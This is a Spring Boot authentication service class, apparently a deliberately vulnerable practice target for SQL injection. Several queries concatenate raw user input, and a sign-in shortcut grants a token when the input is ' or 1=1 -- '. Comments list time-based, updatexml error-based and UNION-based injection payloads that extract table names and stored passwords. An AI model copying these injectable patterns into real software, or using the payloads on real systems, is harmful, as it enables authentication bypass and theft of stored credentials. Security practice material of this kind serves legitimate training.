package com.estate.back.service.implimentation;

import java.util.List;
import java.util.Map;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.jdbc.core.BeanPropertyRowMapper;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

import com.estate.back.common.util.EmailAuthNumberUtil;
import com.estate.back.dto.request.auth.DeleteUserRequestDto;
import com.estate.back.dto.request.auth.EmailAuthCheckRequestDto;
import com.estate.back.dto.request.auth.EmailAuthRequestDto;
import com.estate.back.dto.request.auth.GetMatchQnaDetailPasswdRequestDto;
import com.estate.back.dto.request.auth.GetMatchQnaWritePasswdRequestDto;
import com.estate.back.dto.request.auth.SignInRequestDto;
import com.estate.back.dto.request.auth.SignUpRequestDto;
import com.estate.back.dto.request.auth.idCheckRequestDto;
import com.estate.back.dto.response.ResponseCode;
import com.estate.back.dto.response.ResponseDto;
import com.estate.back.dto.response.auth.SignInResponseDto;
import com.estate.back.entity.BoardEntity;
import com.estate.back.entity.EmailAuthNumberEntity;
import com.estate.back.entity.UserEntity;
import com.estate.back.provider.JwtProvider;
import com.estate.back.provider.MailProvider;
import com.estate.back.repository.BoardRepository;
import com.estate.back.repository.EmailAuthNumberRepository;
import com.estate.back.repository.QnaDetailPasswdRepository;
import com.estate.back.repository.QnaWritePasswdRepository;
import com.estate.back.repository.UserRepository;
import com.estate.back.service.AuthService;

import jakarta.mail.MessagingException;
import lombok.RequiredArgsConstructor;

// Auth 모듈의 비즈니스 로직 구현체

@Service
@RequiredArgsConstructor
public class AuthServiceimplimentation implements AuthService {
    private final JwtProvider jwtProvider;
    private final MailProvider mailProvider;
    private final UserRepository userRepository;
    private final BoardRepository boardRepository;
    private final EmailAuthNumberRepository emailAuthNumberRepository;
    private final QnaWritePasswdRepository qnaWritePasswdRepository;
    private final QnaDetailPasswdRepository qnaDetailPasswdRepository;
    @Autowired
    private JdbcTemplate jdbcTemplate;

    private PasswordEncoder passwordEncoder = new BCryptPasswordEncoder();

    @Override
    public ResponseEntity<ResponseDto> idCheck(idCheckRequestDto dto) 
    {
        try 
        {
            String userId = dto.getUserId();
            //boolean existedUser = userRepository.existsByUserId(userId);

            String query = "SELECT * FROM user WHERE user_id = '" + userId + "'";
            List<Map<String, Object>> result = jdbcTemplate.queryForList(query);

            //' OR IF((SELECT COUNT(*) FROM user WHERE user_id = '00-w-00') > 0, SLEEP(1.5), 1) -- 

            if(!result.isEmpty())
            {
                return ResponseDto.duplicatedId();
            }

            //if (existedUser)
            //    return ResponseDto.duplicatedId();
        } 
        catch (Exception exception) 
        {
            exception.printStackTrace();
            return ResponseDto.databaseError();
        }

        return ResponseDto.success();
    }

    /*
     * @Override
     * public ResponseEntity<? super SignInResponseDto> signIn(SignInRequestDto dto)
     * {
     * String accessToken = null;
     * try
     * {
     * String userId = dto.getUserId();
     * String userPassword = dto.getUserPassword();
     * 
     * UserEntity userEntity = userRepository.findByUserId(userId);
     * if(userEntity == null) return ResponseDto.signInFailed();
     * 
     * String encodedPassword = userEntity.getUserPassword();
     * boolean isMatched = passwordEncoder.matches(userPassword, encodedPassword);
     * if (!isMatched) return ResponseDto.signInFailed();
     * 
     * accessToken = jwtProvider.create(userId);
     * if(accessToken == null) return ResponseDto.tokenCreationFailed();
     * }
     * catch(Exception exception)
     * {
     * exception.printStackTrace();
     * return ResponseDto.databaseError();
     * }
     * 
     * return SignInResponseDto.success(accessToken);
     * }
     */

    @Override
    public ResponseEntity<? super SignInResponseDto> signIn(SignInRequestDto dto) 
    {
        try 
        {
            String userId = dto.getUserId();
            String userPassword = dto.getUserPassword();

            boolean SqliInjection = userId.equals("' or 1=1 -- ");

            String sql = "SELECT * FROM user WHERE user_id = '" + userId + "';";
            List<UserEntity> result = jdbcTemplate.query(sql, new BeanPropertyRowMapper<>(UserEntity.class));
            
            if (result.size()==0)
            {
                return ResponseDto.signInFailed();
            }
            
            if(!SqliInjection)
            {
                boolean isMatched = false;
                String encodedPassword = result.get(0).getUserPassword();
                isMatched = passwordEncoder.matches(userPassword, encodedPassword);
                if(!isMatched)
                {
                    return ResponseDto.signInFailed();
                }
            }

            String accessToken = jwtProvider.create(SqliInjection ? "IamWhiteHatHacker" : userId);
            if (accessToken == null)
                return ResponseDto.tokenCreationFailed();
            return SignInResponseDto.success(accessToken);
        } 
        catch (Exception e) 
        {
            e.printStackTrace();
            return ResponseDto.databaseError();
        }
    }

    @Override
    public ResponseEntity<ResponseDto> emailAuth(EmailAuthRequestDto dto) {
        try {
            String userEmail = dto.getUserEmail();
            //boolean existedEmail = userRepository.existsByUserEmail(userEmail);
            //if (existedEmail)
                //return ResponseDto.duplicatedEmail();

            //String authNumber = EmailAuthNumberUtil.createCodeNumber();
            String authNumber = EmailAuthNumberUtil.createNumber();

            EmailAuthNumberEntity emailAuthNumberEntity = new EmailAuthNumberEntity(userEmail, authNumber);
            emailAuthNumberRepository.save(emailAuthNumberEntity);
            //mailProvider.mailAuthSend(userEmail, authNumber);
            
            ResponseDto responseDto = new ResponseDto(ResponseCode.SUCCESS, userEmail);
            return ResponseEntity.status(HttpStatus.OK).body(responseDto);
        } 
        //catch (MessagingException exception) 
        //{
            //exception.printStackTrace();
            //return ResponseDto.mailSendFailed();
        //}
        catch (Exception exception) 
        {
            exception.printStackTrace();
            return ResponseDto.databaseError();
        }
    }

    @Override
    public ResponseEntity<ResponseDto> emailAuthCheck(EmailAuthCheckRequestDto dto) 
    {
        try 
        {
            String userEmail = dto.getUserEmail();
            String authNumber = dto.getAuthNumber();

            // boolean isExists;
            //isExists = emailAuthNumberRepository.existsByEmailAndAuthNumber(userEmail,authNumber);
            // if(!isExists)
            // {
            //      return ResponseDto.authenticationFailed();
            // }

            String sql = "SELECT COUNT(*) FROM email_auth_number WHERE email = '" + userEmail + "' AND auth_number = '" + authNumber + "'";

            Integer count = jdbcTemplate.queryForObject(sql, Integer.class);
            if (count == null || count == 0) 
            {
                return ResponseDto.authenticationFailed();
            }
        }
        catch (Exception exception) 
        {
            exception.printStackTrace();
            return ResponseDto.databaseError();
        }

        return ResponseDto.success();
    }

    @Override
    public ResponseEntity<ResponseDto> signUp(SignUpRequestDto dto) {
        try {
            String userId = dto.getUserId();
            String userPassword = dto.getUserPassword();
            String userEmail = dto.getUserEmail();
            String authNumber = dto.getAuthNumber();

            boolean existedUser = userRepository.existsByUserId(userId);
            if (existedUser)
                return ResponseDto.duplicatedId();

            boolean existedEmail = userRepository.existsByUserEmail(userEmail);
            if (existedEmail)
                return ResponseDto.duplicatedEmail();

            boolean isMatched = emailAuthNumberRepository.existsByEmailAndAuthNumber(userEmail, authNumber);
            if (!isMatched)
                return ResponseDto.authenticationFailed();

            String encodedPassword = passwordEncoder.encode(userPassword);
            dto.setUserPassword(encodedPassword);

            UserEntity userEntity = new UserEntity(dto);
            userRepository.save(userEntity);
        } catch (Exception exception) {
            exception.printStackTrace();
            return ResponseDto.databaseError();
        }

        return ResponseDto.success();
    }

    @Override
    public ResponseEntity<ResponseDto> deleteUser(DeleteUserRequestDto dto, String userId) {
        try 
        {
            String UserId = dto.getUserId();
            boolean isMatchedUserId = UserId.equals(userId);
            if (!isMatchedUserId)
                return ResponseDto.authenticationFailed();

            boolean existedUser = userRepository.existsByUserId(userId);
            if (!existedUser)
                return ResponseDto.authenticationFailed();

            boardRepository.deleteByWriterId(userId);
            userRepository.deleteByUserId(userId);
            emailAuthNumberRepository.deleteByEmail(dto.getUserEmail());
        } 
        catch (Exception exception) 
        {
            exception.printStackTrace();
            return ResponseDto.databaseError();
        }
        return ResponseDto.success();
    }

    //수정
    @Override 
    public ResponseEntity<ResponseDto> matchQnaWritePasswd(GetMatchQnaWritePasswdRequestDto dto,String userId)
    {
        try 
        {
            boolean existedUser = userRepository.existsByUserId(userId);
            if (!existedUser)
                return ResponseDto.authenticationFailed();
            
            boolean isMatched;
            isMatched = qnaWritePasswdRepository.existsByUserIdAndQnaWritePasswd("qna_write_passwd", dto.getQnaWritePasswd());
            
            if (!isMatched)
            {
                return ResponseDto.passwordDoesNotMatch();
            }
        } 
        catch (Exception exception) 
        {
            exception.printStackTrace();
            return ResponseDto.databaseError();
        }
        return ResponseDto.success();
    }

    @Override 
    public ResponseEntity<ResponseDto> matchQnaDetailPasswd(GetMatchQnaDetailPasswdRequestDto dto,String userId)
    {
        try 
        {
            boolean existedUser = userRepository.existsByUserId(userId);
            if (!existedUser)
                return ResponseDto.authenticationFailed();
            
            boolean isMatched;
            isMatched = qnaDetailPasswdRepository.existsByUserIdAndQnaDetailPasswd("qna_detail_passwd", dto.getQnaDetailPasswd());

            if (!isMatched)
            {
                return ResponseDto.passwordDoesNotMatch();
            }
        } 
        catch (Exception exception) 
        {
            exception.printStackTrace();
            return ResponseDto.databaseError();
        }
        return ResponseDto.success();
    }

    @Override 
    public ResponseEntity<ResponseDto> searchQnaWritePasswd(GetMatchQnaWritePasswdRequestDto dto,String userId)
    {
        try
        {
            boolean existedUser = userRepository.existsByUserId(userId);
            if (!existedUser)
                return ResponseDto.authenticationFailed();

            
            if(dto.getQnaWritePasswd().contains("qna_detail_passwd"))
            {
                return ResponseDto.passwordDoesNotMatch();
            }

            //boolean isMatched;
            //isMatched = qnaWritePasswdRepository.existsByUserIdAndQnaWritePasswd("qna_write_passwd", dto.getQnaWritePasswd());

            // SQL 인젝션 테스트용 취약한 방식 사용
            String passwd = dto.getQnaWritePasswd();
            String query = "SELECT * FROM qna_write_passwd WHERE user_id = 'qna_write_passwd' AND qna_write_passwd = '" + passwd + "'";
            List<Map<String, Object>> result = jdbcTemplate.queryForList(query);
            
            if (result.isEmpty())
            {
                return ResponseDto.passwordDoesNotMatch();
            }
        } 
        catch (Exception exception) 
        {
            ResponseDto responseDto = new ResponseDto(ResponseCode.DATABASE_ERROR, exception.getMessage());
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(responseDto);
        }
        return ResponseDto.success();
    }
    /*
    ' AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1) -- -
    ' AND updatexml(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema = 'estate' LIMIT 0,1), 0x7e), 1) -- -
    ' AND updatexml(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name = 'qna_write_passwd' AND table_schema = 'estate' LIMIT 0,1), 0x7e), 1) -- -
    ' AND updatexml(1, concat(0x7e, (SELECT qna_write_passwd FROM qna_write_passwd LIMIT 4,1), 0x7e), 1) -- -

    ' AND updatexml(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e), 1) -- 
    ' AND updatexml(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='qna_write_passwd' LIMIT 0,1), 0x7e), 1) -- 
    ' AND updatexml(1, concat(0x7e, (SELECT qna_write_passwd FROM qna_write_passwd WHERE user_id='qna_write_passwd'), 0x7e), 1) -- 
    ' AND updatexml(1, concat(0x7e, (SELECT qna_write_passwd FROM qna_write_passwd LIMIT 0,1), 0x7e), 1) -- 
     */

    //' AND updatexml(1, concat(0x7e, (SELECT qna_detail_passwd FROM qna_detail_passwd LIMIT 6,1), 0x7e), 1) -- 

    public ResponseEntity<ResponseDto> searchQnaDetailPasswd(GetMatchQnaDetailPasswdRequestDto dto,String userId)
    {
        try 
        {
            boolean existedUser = userRepository.existsByUserId(userId);
            if (!existedUser)
                return ResponseDto.authenticationFailed();
            
            if(dto.getQnaDetailPasswd().contains("qna_write_passwd"))
            {
                return ResponseDto.passwordDoesNotMatch();
            }
            //boolean isMatched;
            //isMatched = qnaDetailPasswdRepository.existsByUserIdAndQnaDetailPasswd("qna_detail_passwd", dto.getQnaDetailPasswd());

            // SQL 인젝션 테스트용 취약한 방식 사용
            String passwd = dto.getQnaDetailPasswd();
            String query = "SELECT * FROM qna_detail_passwd WHERE user_id = 'qna_detail_passwd' AND qna_detail_passwd = '" + passwd + "'";
            List<Map<String, Object>> result = jdbcTemplate.queryForList(query);

            if (result.isEmpty())
            {
                return ResponseDto.passwordDoesNotMatch();
            }

            ResponseDto responseDto = new ResponseDto(ResponseCode.SUCCESS, result.toString());
            return ResponseEntity.status(HttpStatus.OK).body(responseDto);
        } 
        catch (Exception exception)
        {
            return ResponseDto.databaseError();
        }
    }

    //' UNION SELECT 1,2,3 -- 
    //' UNION SELECT 1,2,database() -- 
    //' UNION SELECT 1,2,table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1 -- 
    //' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name = 'qna_detail_passwd' LIMIT 0,1 -- 
    //' UNION SELECT 1,2,qna_detail_passwd FROM qna_detail_passwd LIMIT 0,1 -- 
}
/* 최종완료 */